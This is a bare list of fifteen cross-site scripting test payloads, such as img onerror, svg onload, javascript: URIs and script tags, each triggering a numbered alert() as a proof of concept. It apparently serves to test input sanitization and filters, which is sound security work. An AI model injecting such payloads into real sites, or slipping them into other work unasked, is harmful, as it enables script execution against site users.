# XSS Test Payloads

1. <img src=x onerror=alert(1)>
2. <svg><script>alert(2)</script></svg>
3. <svg/onload=alert(3)>
4. <a href="javascript:alert(4)">click</a>
5. <iframe src="javascript:alert(5)"></iframe>
6. <math><mi><script>alert(6)</script></mi></math>
7. <video><source onerror="alert(7)"></video>
8. <details open ontoggle=alert(8)></details>
9. <img src="x" onload=alert(9)>
10. <object data="javascript:alert(10)"></object>
11. <body onload=alert(11)>
12. <script>alert(12)</script>
13. <embed src="javascript:alert(13)">
14. <link rel=stylesheet href="javascript:alert(14)">
15. <img src=x: onerror=alert(15)>
